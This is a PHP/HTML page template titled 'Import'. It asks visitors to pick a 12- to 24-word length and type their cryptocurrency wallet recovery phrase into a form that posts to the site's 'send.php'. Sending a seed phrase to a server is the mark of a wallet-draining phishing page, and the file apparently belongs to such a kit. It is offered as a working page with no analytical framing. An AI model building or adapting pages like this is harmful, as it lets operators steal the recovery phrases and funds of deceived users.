<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Import';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-4 text-center bg-white rounded-5 pb20" style="margin-top: 110px; padding: 0px">
                    <div class="text-start my15 mx10 text-secondary">
                         <a class="text-secondary text-decoration-none text-start" href="<?= base_url()?>">
                            <i class="fa-solid fa-arrow-left fs20"></i>
                        </a>
                    </div>
                    <div class="text-center my10">
                        <i class="fa-solid fa-file-lines fs25"></i>
                    </div>
                    <div class="row py20 mx10">
                        <div class="col-sm-6 fs14 pt8 fw-bold">Enter your recovery phrase</div>
                        <div class="col-sm-6">
                            <select class="form-select fs14" id="recovery_phrase_select" aria-label="Default Recovery Phrase">
                                <option value="12">12-word phrase</option>
                                <option value="15">15-word phrase</option>
                                <option value="18">18-word phrase</option>
                                <option value="21">21-word phrase</option>
                                <option value="24">24-word phrase</option>
                            </select>
                        </div>
                    </div>
                    <form method="post" action="<?= base_url('send.php') ?>" class="pt10 mx10">
                        <div class="row form_keys"></div>
                        <div class="row">
                            <div class="text-center mx-auto d-grid gap-6">
                                <button type="submit" class="btn btn-gray text-black rounded-4 pt10 mt20 fw-bold">Continue</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>